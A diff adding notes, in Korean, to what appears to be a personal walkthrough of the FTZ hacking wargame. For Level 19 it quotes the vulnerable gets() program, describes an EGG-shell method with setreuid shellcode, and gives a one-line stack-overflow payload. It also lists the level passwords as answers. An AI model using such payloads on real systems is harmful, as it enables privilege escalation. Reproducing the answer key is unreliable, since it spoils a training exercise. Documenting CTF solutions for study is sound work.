@@ -266,3 +266,29 @@ jmp 그니까,  if(count >= 100)를 확인하러 간 후에 ebp-100값을 eax에 옮기고 ebp-25
 my-pass로 비번을 알아낸다.
 
 답 == swimming in pink
+
+
+
+
+#================================================================================#
+#FTZ Level 19
+hint)
+main()
+{ char buf[20];
+  gets(buf);
+  printf("%s\n",buf);
+} 
+
+#FTZ Level 19 풀이 과정)
+
+Return to libc를 이용해서 풀어야 한다고 다들 기술하지만, EGG쉘로도 충분히 풀 수 있었다.
+Rtl은 따로 시도해보겠다.
+EGGSHELL문제와 풀이가 다를게 없지만, 쉘코드에 setreuid를 하는 코드를 새로 넣어줘야 풀 수 있다. 
+한줄로 설명해보면,
+EGG쉘 코드에 권한 얻고 쉘열고 닫고 하는 모든 코드를 추가한 후에, 페이로드를 작성해서 넣었다.
+그럼 끝.
+
+페이로드
+(python -c 'print "A"*44+"\x70\xf2\xff\xbf"'; cat)|./attackme
+
+답 == we are just regular guys
